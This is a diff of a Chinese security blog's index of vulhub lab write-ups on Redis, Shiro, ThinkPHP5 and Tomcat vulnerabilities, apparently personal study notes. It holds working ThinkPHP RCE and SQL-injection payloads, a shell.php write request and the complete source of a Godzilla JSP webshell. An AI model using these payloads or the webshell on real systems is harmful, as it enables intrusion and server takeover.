+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/yiiiing/article/details/108218674">Redis 4.x5.x 未授权访问漏洞EXP复现过程</a></p>
+<p><a href="https://blog.csdn.net/roukmanx/article/details/103682318">Redis 4.x/5.x 未授权访问漏洞</a></p>
+<p><a href="https://www.cnblogs.com/rnss/p/13612703.html">redis 4-unacc 复现</a></p>
 ]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
       <tags>
-        <tag>Redis rce</tag>
+        <tag>redis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shiro权限绕过CVE-2020-1957</title>
+    <url>/2021/09/11/shiro-CVE-2020-1957/</url>
+    <content><![CDATA[<h2 id="shiro权限绕过CVE-2020-1957"><a href="#shiro权限绕过CVE-2020-1957" class="headerlink" title="shiro权限绕过CVE-2020-1957"></a>shiro权限绕过CVE-2020-1957</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>1.5.2版本以下</p>
+<h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>shiro通过拦截器来实现对用户访问权限的控制和拦截，有anon,authc拦截器</p>
+<blockquote>
+<p>anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口<br>authc为登录拦截器，需要登录认证才能访问的资源</p>
+</blockquote>
+<p>在shiro.ini编写匹配的url配置，将会拦截匹配的url，并执行响应的拦截器，实现对url的控制</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[urls]</span><br><span class="line">&#x2F;index.html &#x3D; anon</span><br><span class="line">&#x2F;user&#x2F;** &#x3D; authc</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如上，访问/index.html时anon拦截器不会进行登录判断，而访问/user/xxx等页面时，authc拦截器会进行登录判断</p>
+</blockquote>
+<p>url路径表达式通常为ant格式，路径通配符支持 <code>?</code>  <code>*</code> <code>**</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?：匹配一个字符</span><br><span class="line">*：匹配零个或多个字符串</span><br><span class="line">**：匹配路径中的零个或多个路径</span><br></pre></td></tr></table></figure>
+<p><code>/*</code>可以匹配到<code>/admin</code>，而匹配不到<code>/admin/</code>因为<code>*</code>不能匹配路径</p>
+<p>这是如果对/admin设置了authc拦截器，访问该页面会进行登录判断；当请求的/admin/时会因为<code>/*</code>无法正确路径，会放行进入spring(Servlet)拦截器，最终/admin和/admin/访问到的资源是一样的</p>
+<p>或者说是spring web匹配url的时候没有匹配上/导致绕过</p>
+<p>请求的URL在整个项目的传入传递过程中，在使用了shiro的项目，是我们请求的URL(URL1),进过shiro权限检验(URL2), 最后到springboot项目找到路由来处理(URL3)，漏洞就出现在URL1,URL2和URL3 有可能不是同一个URL，这就导致我们能绕过shiro的校验，直接访问后端需要首选的URL</p>
+<p><img src="https://i.loli.net/2021/09/11/Q7F6VoACpR1keaW.png" alt="image-20210911212501781"></p>
+<p><img src="https://i.loli.net/2021/09/12/Oc9XgtIHwu5efNp.png" alt="image-20210912171647697"></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.riskivy.com/shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88cve-2020-1957%EF%BC%89/">Shiro 权限绕过漏洞分析（CVE-2020-1957）</a></p>
+<p><a href="https://paper.seebug.org/1196/">Shiro 权限绕过漏洞分析(CVE-2020-1957)</a></p>
+<p><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">CVE-2020-11989（玄武实验室）</a></p>
+]]></content>
+      <categories>
+        <category>shiro</category>
+      </categories>
+      <tags>
+        <tag>shiro</tag>
       </tags>
   </entry>
   <entry>
@@ -814,6 +847,23 @@
       </tags>
   </entry>
   <entry>
+    <title>redis rce 4.x/5.x 基于主从复制</title>
+    <url>/2021/07/24/redis-rce-4-x-5-x-%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</url>
+    <content><![CDATA[<h1 id="基于主从复制的rce"><a href="#基于主从复制的rce" class="headerlink" title="基于主从复制的rce"></a>基于主从复制的rce</h1><h2 id="什么是主从复制"><a href="#什么是主从复制" class="headerlink" title="什么是主从复制"></a>什么是主从复制</h2><p>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而<strong>从机只负责读，主机只负责写</strong>，通过<strong>读写分离</strong>可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式</p>
+<blockquote>
+<p>当数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式</p>
+</blockquote>
+<h2 id="Redis模块"><a href="#Redis模块" class="headerlink" title="Redis模块"></a>Redis模块</h2><p>Redis在4.x以后新增了模块功能，通过外部扩展，可以实现在Redis中实现一个新的Redis命令，通过c并编译出<code>.so</code>文件</p>
+<h2 id="利用范围"><a href="#利用范围" class="headerlink" title="利用范围"></a>利用范围</h2><p>Redis 4.x-Redis 5.x</p>
+<p><img src="https://i.loli.net/2021/07/26/kdjrNSR6bivB1fQ.png" alt="image-20210726101726937"></p>
+<p><img src="https://i.loli.net/2021/07/25/DItCREc985YXj7J.png" alt="image-20210725211335807"></p>
+<p><img src="https://i.loli.net/2021/07/25/pJVHLjYRSyM3h9T.png" alt="image-20210725222651716"></p>
+]]></content>
+      <tags>
+        <tag>Redis rce</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>spring MVC</title>
     <url>/2021/11/27/spring-MVC/</url>
     <content><![CDATA[<h1 id="spring-MVC"><a href="#spring-MVC" class="headerlink" title="spring MVC"></a>spring MVC</h1><p><a href="https://www.cnblogs.com/lihaijia/p/14406480.html">狂神说springMVC笔记</a></p>
@@ -853,38 +903,6 @@
 <p><img src="https://i.loli.net/2021/11/27/fIJAhkdsxmQRg8G.png" alt="image-20211127153138421"></p>
 <h2 id="spring-MVC执行原理"><a href="#spring-MVC执行原理" class="headerlink" title="spring MVC执行原理"></a>spring MVC执行原理</h2><p><img src="https://i.loli.net/2021/11/27/KqmIgUuaGPd5bpH.png" alt="image-20211127172119547"></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>shiro权限绕过CVE-2020-1957</title>
-    <url>/2021/09/11/shiro-CVE-2020-1957/</url>
-    <content><![CDATA[<h2 id="shiro权限绕过CVE-2020-1957"><a href="#shiro权限绕过CVE-2020-1957" class="headerlink" title="shiro权限绕过CVE-2020-1957"></a>shiro权限绕过CVE-2020-1957</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>1.5.2版本以下</p>
-<h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>shiro通过拦截器来实现对用户访问权限的控制和拦截，有anon,authc拦截器</p>
-<blockquote>
-<p>anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口<br>authc为登录拦截器，需要登录认证才能访问的资源</p>
-</blockquote>
-<p>在shiro.ini编写匹配的url配置，将会拦截匹配的url，并执行响应的拦截器，实现对url的控制</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[urls]</span><br><span class="line">&#x2F;index.html &#x3D; anon</span><br><span class="line">&#x2F;user&#x2F;** &#x3D; authc</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>如上，访问/index.html时anon拦截器不会进行登录判断，而访问/user/xxx等页面时，authc拦截器会进行登录判断</p>
-</blockquote>
-<p>url路径表达式通常为ant格式，路径通配符支持 <code>?</code>  <code>*</code> <code>**</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?：匹配一个字符</span><br><span class="line">*：匹配零个或多个字符串</span><br><span class="line">**：匹配路径中的零个或多个路径</span><br></pre></td></tr></table></figure>
-<p><code>/*</code>可以匹配到<code>/admin</code>，而匹配不到<code>/admin/</code>因为<code>*</code>不能匹配路径</p>
-<p>这是如果对/admin设置了authc拦截器，访问该页面会进行登录判断；当请求的/admin/时会因为<code>/*</code>无法正确路径，会放行进入spring(Servlet)拦截器，最终/admin和/admin/访问到的资源是一样的</p>
-<p>或者说是spring web匹配url的时候没有匹配上/导致绕过</p>
-<p>请求的URL在整个项目的传入传递过程中，在使用了shiro的项目，是我们请求的URL(URL1),进过shiro权限检验(URL2), 最后到springboot项目找到路由来处理(URL3)，漏洞就出现在URL1,URL2和URL3 有可能不是同一个URL，这就导致我们能绕过shiro的校验，直接访问后端需要首选的URL</p>
-<p><img src="https://i.loli.net/2021/09/11/Q7F6VoACpR1keaW.png" alt="image-20210911212501781"></p>
-<p><img src="https://i.loli.net/2021/09/12/Oc9XgtIHwu5efNp.png" alt="image-20210912171647697"></p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.riskivy.com/shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88cve-2020-1957%EF%BC%89/">Shiro 权限绕过漏洞分析（CVE-2020-1957）</a></p>
-<p><a href="https://paper.seebug.org/1196/">Shiro 权限绕过漏洞分析(CVE-2020-1957)</a></p>
-<p><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">CVE-2020-11989（玄武实验室）</a></p>
-]]></content>
-      <categories>
-        <category>shiro</category>
-      </categories>
-      <tags>
-        <tag>shiro</tag>
-      </tags>
   </entry>
   <entry>
     <title>thinkphp 5.0.23-rce （核心类 Request rce）</title>
@@ -955,72 +973,6 @@
       </tags>
   </entry>
   <entry>
-    <title>thinkphp5 sql注入</title>
-    <url>/2021/10/28/thinkphp5-sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="thinkphp5-sql注入-amp-信息泄露"><a href="#thinkphp5-sql注入-amp-信息泄露" class="headerlink" title="thinkphp5 sql注入&amp;信息泄露"></a>thinkphp5 sql注入&amp;信息泄露</h2><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>信息泄露&amp;不能子查询的（鸡肋）sql注入</p>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>5.0.13&lt;=ThinkPHP&lt;=5.0.15 、 5.1.0&lt;=ThinkPHP&lt;=5.1.5</p>
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>直接访问是这样</p>
-<p><img src="https://i.loli.net/2021/10/28/rNP47KfJmdMLVps.png" alt="image-20211026111543241"></p>
-<p>爆出用户名密码</p>
-<p><code>index.php?ids[]=1&amp;ids[]=2</code></p>
-<p><img src="https://i.loli.net/2021/10/28/lPvxWIkJYdiaVbj.png" alt="image-20211026111723255"></p>
-<p>使用updatexml报错注入来回显敏感信息</p>
-<p><code>index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</code></p>
-<p><img src="https://i.loli.net/2021/10/28/my1YX3SqfehV2Nl.png" alt="image-20211026112047944"></p>
-<p>另外存在信息泄露，还有pdo预编译的错误信息的数据库和的一些信息和账号密码，但是也连接上不，确认了开放了端口之后那应该是mysql没有配置外连</p>
-<p><img src="https://i.loli.net/2021/10/28/nuPNr4k5tVpLedH.png" alt="image-20211026112755952"></p>
-<p>如果将这里的<code>user()</code>替换为其他子查询语句就会报错，师傅的解释是</p>
-<p>预编译的确是mysql服务端进行的，但是预编译的过程是不接触数据的 ，也就是说不会从表中将真实数据取出来，所以使用子查询的情况下不会触发报错；虽然预编译的过程不接触数据，但类似user()这样的数据库函数的值还是将会编译进SQL语句，所以这里执行并爆了出来</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">ThinkPHP5 SQL注入漏洞 &amp;&amp; PDO真/伪预处理分析</a></p>
-]]></content>
-      <tags>
-        <tag>thinkphp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce</title>
-    <url>/2021/10/25/thinkphp-5-rce/</url>
-    <content><![CDATA[<h2 id="ThinkPHP5-5-0-22-5-1-29-未开启强制路由rce"><a href="#ThinkPHP5-5-0-22-5-1-29-未开启强制路由rce" class="headerlink" title="ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce"></a>ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>因为框架对传入的路由参数过滤不严格，没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以操作非预期的控制器类执行任意方法，从而导致rce</p>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>5.0.5-5.0.22（5.0.x）<br>5.1.0-5.1.30（5.1.x）</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>5.0.x</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php # 包含任意.php文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
-
-
-<p>5.1.x</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>vulhub thinkphp 5-rce</p>
-<p><img src="https://i.loli.net/2021/10/25/uE87XZ3adiMRgbQ.png" alt="image-20211025133109582"></p>
-<p>直接使用5.0.x的poc触发漏洞</p>
-<p><img src="https://i.loli.net/2021/10/25/ELWkrRx1dB5QzA2.png" alt=" "></p>
-<p>默认情况下没有开启强路由，而是默认开启路由兼容模式</p>
-<p>由于没有开启强路由说明可以使用路由兼容模式的<code>s参数</code>，而对控制器名进行严格检测说明可能可以调用任意的控制器，所以得出思路就是利用<code>http://ip/?s=模块/控制器/方法</code>来测试</p>
-<p>构造<code>?s=index/think\config/get&amp;name=database.username</code></p>
-<p>获取配置信息</p>
-<p><img src="https://i.loli.net/2021/10/25/ciuAZ9WULFPfroN.png" alt="image-20211025170829378"></p>
-<p>其中5.1.x的一部分poc并不能利用，原因是一些payload在Windows的主机上是不可利用的，踩坑记录详见第一篇文章的总结</p>
-<blockquote>
-<p>由于windows自动加载类加载不到想要的类文件，所以能够下手的就是在框架加载的时候已经加载的类</p>
-</blockquote>
-<p>所以可以使用兼容多平台的payload，贴上师傅总结的payload</p>
-<p>5.1是下面这些：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">think\Loader </span><br><span class="line">Composer\Autoload\ComposerStaticInit289837ff5d5ea8a00f5cc97a07c04561</span><br><span class="line">think\Error </span><br><span class="line">think\Container</span><br><span class="line">think\App </span><br><span class="line">think\Env </span><br><span class="line">think\Config </span><br><span class="line">think\Hook </span><br><span class="line">think\Facade</span><br><span class="line">think\facade\Env</span><br><span class="line">env</span><br><span class="line">think\Db</span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\Log </span><br><span class="line">think\log\driver\File</span><br><span class="line">think\facade\Route</span><br><span class="line">route</span><br><span class="line">think\Route </span><br><span class="line">think\route\Rule</span><br><span class="line">think\route\RuleGroup</span><br><span class="line">think\route\Domain</span><br><span class="line">think\route\RuleItem</span><br><span class="line">think\route\RuleName</span><br><span class="line">think\route\Dispatch</span><br><span class="line">think\route\dispatch\Url</span><br><span class="line">think\route\dispatch\Module</span><br><span class="line">think\Middleware</span><br><span class="line">think\Cookie</span><br><span class="line">think\View</span><br><span class="line">think\view\driver\Think</span><br><span class="line">think\Template</span><br><span class="line">think\template\driver\File</span><br><span class="line">think\Session</span><br><span class="line">think\Debug</span><br><span class="line">think\Cache</span><br><span class="line">think\cache\Driver</span><br><span class="line">think\cache\driver\File</span><br></pre></td></tr></table></figure>
-<p>5.0 的有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">think\Route</span><br><span class="line">think\Config</span><br><span class="line">think\Error</span><br><span class="line">think\App</span><br><span class="line">think\Request</span><br><span class="line">think\Hook</span><br><span class="line">think\Env</span><br><span class="line">think\Lang</span><br><span class="line">think\Log</span><br><span class="line">think\Loader</span><br></pre></td></tr></table></figure>
-<p>两个版本公有的是：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">think\Route </span><br><span class="line">think\Loader </span><br><span class="line">think\Error </span><br><span class="line">think\App </span><br><span class="line">think\Env </span><br><span class="line">think\Config </span><br><span class="line">think\Hook </span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\Log</span><br></pre></td></tr></table></figure>
-<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>升级框架版本，新版本中修复了控制器的调用</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://xz.aliyun.com/t/3570">[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录</a></p>
-<p><a href="https://www.anquanke.com/post/id/252811#h3-7">ThinkPHP V5 漏洞复现</a></p>
-]]></content>
-      <tags>
-        <tag>thinkphp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>tomcat rce cve-2017-12615</title>
     <url>/2021/07/24/tomcat-rce-cve-2017-12615/</url>
     <content><![CDATA[<p>vulhub来复现一下Tomcat CVE-2017-12615</p>
@@ -1080,33 +1032,46 @@
       </tags>
   </entry>
   <entry>
-    <title>tomcat8 弱口令</title>
-    <url>/2021/09/09/tomcat8-%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
-    <content><![CDATA[<h2 id="tomcat8-弱口令"><a href="#tomcat8-弱口令" class="headerlink" title="tomcat8 弱口令"></a>tomcat8 弱口令</h2><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击</p>
-<p>用户权限在<code>conf/tomcat-users.xml</code>文件中配置</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;tomcat-users xmlns&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml&quot;</span><br><span class="line">              xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">              xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml tomcat-users.xsd&quot;</span><br><span class="line">              version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-gui&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-script&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-jmx&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-status&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;admin-gui&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;admin-script&quot;&#x2F;&gt;</span><br><span class="line">    &lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;tomcat&quot; roles&#x3D;&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; &#x2F;&gt;</span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;tomcat-users&gt;</span><br></pre></td></tr></table></figure>
+    <title>ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce</title>
+    <url>/2021/10/25/thinkphp-5-rce/</url>
+    <content><![CDATA[<h2 id="ThinkPHP5-5-0-22-5-1-29-未开启强制路由rce"><a href="#ThinkPHP5-5-0-22-5-1-29-未开启强制路由rce" class="headerlink" title="ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce"></a>ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>因为框架对传入的路由参数过滤不严格，没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以操作非预期的控制器类执行任意方法，从而导致rce</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>5.0.5-5.0.22（5.0.x）<br>5.1.0-5.1.30（5.1.x）</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>5.0.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php # 包含任意.php文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
 
 
-<p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限</p>
-<p>docker搭建环境</p>
-<p><img src="https://i.loli.net/2021/09/10/A64IXcg2RTUEzie.png" alt="image-20210910170730975"></p>
-<p>访问<code>xxx:8080/manager/html</code>弱口令tomcat、tomcat登录</p>
-<p><img src="https://i.loli.net/2021/09/10/vzZhNtUiDgGwF1x.png" alt="image-20210910171611943"></p>
-<p>找到上传点</p>
-<p>哥斯拉默认配置生成111.jsp，新建111文件夹，压缩后修改后缀为war</p>
+<p>5.1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>vulhub thinkphp 5-rce</p>
+<p><img src="https://i.loli.net/2021/10/25/uE87XZ3adiMRgbQ.png" alt="image-20211025133109582"></p>
+<p>直接使用5.0.x的poc触发漏洞</p>
+<p><img src="https://i.loli.net/2021/10/25/ELWkrRx1dB5QzA2.png" alt=" "></p>
+<p>默认情况下没有开启强路由，而是默认开启路由兼容模式</p>
+<p>由于没有开启强路由说明可以使用路由兼容模式的<code>s参数</code>，而对控制器名进行严格检测说明可能可以调用任意的控制器，所以得出思路就是利用<code>http://ip/?s=模块/控制器/方法</code>来测试</p>
+<p>构造<code>?s=index/think\config/get&amp;name=database.username</code></p>
+<p>获取配置信息</p>
+<p><img src="https://i.loli.net/2021/10/25/ciuAZ9WULFPfroN.png" alt="image-20211025170829378"></p>
+<p>其中5.1.x的一部分poc并不能利用，原因是一些payload在Windows的主机上是不可利用的，踩坑记录详见第一篇文章的总结</p>
 <blockquote>
-<p>111.jsp</p>
+<p>由于windows自动加载类加载不到想要的类文件，所以能够下手的就是在框架加载的时候已经加载的类</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%! String xc&#x3D;&quot;3c6e0b8a9c15224a&quot;; String pass&#x3D;&quot;pass&quot;; String md5&#x3D;md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c&#x3D;javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret &#x3D; null;try &#123;java.security.MessageDigest m;m &#x3D; java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret &#x3D; new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object Encoder &#x3D; base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value &#x3D; (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder &#x3D; base64.newInstance(); value &#x3D; (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object decoder &#x3D; base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder &#x3D; base64.newInstance(); value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;%&gt;&lt;%try&#123;byte[] data&#x3D;base64Decode(request.getParameter(pass));data&#x3D;x(data, false);if (session.getAttribute(&quot;payload&quot;)&#x3D;&#x3D;null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut&#x3D;new java.io.ByteArrayOutputStream();Object f&#x3D;((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;</span><br></pre></td></tr></table></figure>
-<p>上传111.war，连接</p>
-<p><img src="https://i.loli.net/2021/09/10/m1JPLjuZ8y2A7Oe.png" alt="image-20210910175031855"></p>
-<p><img src="https://i.loli.net/2021/09/10/xYRn934CsoJLW6M.png" alt="image-20210910175133308"></p>
+<p>所以可以使用兼容多平台的payload，贴上师傅总结的payload</p>
+<p>5.1是下面这些：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">think\Loader </span><br><span class="line">Composer\Autoload\ComposerStaticInit289837ff5d5ea8a00f5cc97a07c04561</span><br><span class="line">think\Error </span><br><span class="line">think\Container</span><br><span class="line">think\App </span><br><span class="line">think\Env </span><br><span class="line">think\Config </span><br><span class="line">think\Hook </span><br><span class="line">think\Facade</span><br><span class="line">think\facade\Env</span><br><span class="line">env</span><br><span class="line">think\Db</span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\Log </span><br><span class="line">think\log\driver\File</span><br><span class="line">think\facade\Route</span><br><span 